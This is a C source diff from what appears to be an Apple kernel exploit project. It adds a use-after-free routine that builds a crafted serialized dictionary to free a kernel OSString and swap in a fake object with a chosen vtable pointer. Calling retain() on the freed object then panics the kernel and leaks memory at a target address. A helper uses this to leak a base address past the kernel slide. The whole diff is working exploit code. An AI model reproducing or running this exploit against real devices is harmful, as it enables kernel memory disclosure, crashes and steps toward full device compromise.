@@ -6,7 +6,7 @@
 
 #include "common.h"             // DEBUG
 #include "io.h"                 // kOS*, dict_parse, _io_*
-#include "slide.h"              // get_kernel_anchor
+#include "slide.h"              // get_kernel_anchor, get_kernel_slide
 #include "try.h"                // THROW, TRY, RETHROW
 
 #include "uaf_panic.h"
@@ -45,32 +45,81 @@ static void print_info(void)
     DEBUG("**********************************");
 }
 
-void uaf_panic_read(addr_t addr)
+void uaf_with_vtab(addr_t addr)
 {
-    addr_t vtab[5] =
-    {
-        0x0,
-        0x0,
-        0x0,
-        0x0,
-        addr,
-    };
+#ifdef __LP64__
+#   define NATIVE "uint64"
+#else
+#   define NATIVE "uint32"
+#endif
+    DEBUG("Using UAF to leak a " NATIVE " from address " ADDR "...", addr);
+#undef NATIVE
+
     OSString osstr =
     {
-        .vtab = (vtab_t)vtab,
+        .vtab = (vtab_t)(addr - 4 * sizeof(void*)),
         .retainCount = 100,
         .flags = kOSStringNoCopy,
         .length = 0,
         .string = NULL,
     };
+    uint32_t *data = (uint32_t*)&osstr;
+    const char str[4] = "str",
+               ref[4] = "ref";
+    uint32_t dict[8 + sizeof(OSString) / sizeof(uint32_t)] =
+    {
+        kOSSerializeMagic,                                              // Magic
+        kOSSerializeEndCollection | kOSSerializeDictionary | 4,         // Dictionary with 4 entries
+
+        kOSSerializeString | 4,                                         // String that'll get freed
+        *((uint32_t*)str),
+        kOSSerializeData | sizeof(OSString),                            // OSData that will replace our string
+#ifdef __LP64__
+        data[0],                                                        // vtable (lower half)
+        data[1],                                                        // vtable (upper half)
+        data[2],                                                        // retainCount
+        data[3],                                                        // flags
+        data[4],                                                        // length
+        data[5],                                                        // (padding)
+        data[6],                                                        // string pointer (lower half)
+        data[7],                                                        // string pointer (upper half)
+#else
+        data[0],                                                        // vtable
+        data[1],                                                        // retainCount
+        data[2],                                                        // flags
+        data[3],                                                        // length
+        data[4],                                                        // string pointer
+#endif
+
+        kOSSerializeSymbol | 4,                                         // Just a name
+        *((uint32_t*)ref),
+        kOSSerializeEndCollection | kOSSerializeObject | 1,             // Call ->retain() on the freed string
+    };
+
+    print_info();
+
+    DEBUG("Triggering panic!");
+
+    dict_parse(dict, sizeof(dict));
+    // Write everything to disk
+    sync();
+    // Allow SSH/syslog to deliver latest output
+    sleep(3);
+
+    DEBUG("...shit, we're still here.");
 }
 
+void uaf_panic_leak_DATA_const_base(void)
+{
+    uaf_with_vtab(KERNEL_BASE + get_kernel_slide() + 0x244);
+}
+
+void uaf_panic_leak_vtab(void)
+{
 #define NUMSTR_PLUG 255
 #define NUMSTR_PAD   64
 #define NUM_CLIENTS  16
 
-void uaf_panic_leak_vtab(void)
-{
     DEBUG("Using UAF to leak vtable...");
 
     const char str[4] = "str";
@@ -196,4 +245,8 @@ void uaf_panic_leak_vtab(void)
         }
         _io_release_client(client_plug);
     })
+
+#undef NUMSTR_PLUG
+#undef NUMSTR_PAD
+#undef NUM_CLIENTS
 }
